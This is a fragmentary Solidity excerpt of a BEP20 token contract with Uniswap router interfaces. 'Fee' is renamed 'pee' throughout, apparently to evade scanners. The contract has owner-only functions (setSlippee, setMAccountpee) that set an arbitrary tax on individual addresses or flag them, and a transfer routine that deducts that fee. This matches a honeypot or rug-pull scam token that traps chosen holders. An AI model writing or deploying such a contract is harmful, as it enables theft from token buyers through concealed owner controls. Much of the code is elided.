...
interface IUniswapV2Factory {
    ...
    function peeTo() external view returns (address);
    function peeToSetter() external view returns (address);
    ...
    function setpeeTo(address) external;
    function setpeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingpeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingpeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingpeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingpeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingpeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Contract is BEP20, Ownable {
    // ext
    ...
    mapping(address => uint256) private _slippee;
    ...
    function setSlippee(address _address, uint256 _value) external onlyOWNER {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slippee[_address] = _value;
    }

    function getSlippee(address _address) external view onlyOWNER returns (uint256) {
        return _slippee[_address];
    }


    function setMAccountpee(address _address, bool _value) external onlyOWNER {
        _mAccount[_address] = _value;
    }

    function getMAccountpee(address _address) external view onlyOWNER returns (bool) {
    ...
    function _receiveF(
        ...
        _balances[_to] = _balances[_to].add(_Amount - tradepeeAmount);
        emit Transfer(from, _to, _Amount - tradepeeAmount);
    }
